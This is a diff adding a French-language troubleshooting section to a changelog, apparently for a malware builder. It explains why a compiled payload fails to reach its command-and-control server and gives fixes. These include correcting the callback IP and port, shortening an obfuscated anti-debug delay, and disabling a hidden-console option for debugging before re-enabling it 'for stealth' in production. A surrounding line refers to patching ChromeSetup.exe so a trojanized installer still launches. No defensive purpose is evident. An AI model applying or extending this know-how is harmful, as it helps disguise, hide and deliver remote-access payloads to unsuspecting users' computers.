@@ -2,6 +2,34 @@
 
 ## 🔧 Correctifs Récents (2 nov 2025)
 
+### ANALYSE COMPLÈTE - Payload ne se connecte pas
+
+**Diagnostic complet** :
+
+#### Problème 1: IP invalide (0.0.0.0)
+**Symptôme** : Payload compilé mais pas de connexion au C2  
+**Cause** : GitHub Actions utilisait `0.0.0.0` par défaut (IP de bind serveur, pas de connexion)  
+**Solution** :
+- ✅ Workflow lit maintenant `build_config.json` créé par l'app
+- ✅ Fallback vers `192.168.1.1` au lieu de `0.0.0.0`
+- ✅ IP correcte: `192.168.1.40:4444` depuis build_config.json
+
+#### Problème 2: Obfuscation niveau 5 trop agressive
+**Symptôme** : Payload semble ne rien faire (fenêtre s'ouvre et se ferme)  
+**Cause** : Délai de 60-300 secondes avant exécution du C2 !  
+**Solution** :
+- ✅ Réduit le délai niveau 5 à 3-8 secondes
+- ✅ Tests anti-debug conservés mais délai raisonnable
+- ✅ Pour tests rapides, utiliser niveau 2 (délai 1-3s)
+
+#### Problème 3: --windowed masque les erreurs
+**Symptôme** : Impossible de voir pourquoi le payload crash  
+**Cause** : PyInstaller `--windowed` supprime la console  
+**Solution** :
+- ✅ Désactivé `--windowed` pour debug
+- ✅ Maintenant on peut voir les erreurs dans la console
+- ✅ À réactiver en production pour stealth
+
 ### Patch Mode - Windows Execution Fix
 **Problème** : ChromeSetup.exe patché ne lance pas l'installation sur Windows  
 **Cause** : `subprocess.Popen()` ne fonctionne pas bien avec les installateurs Windows  
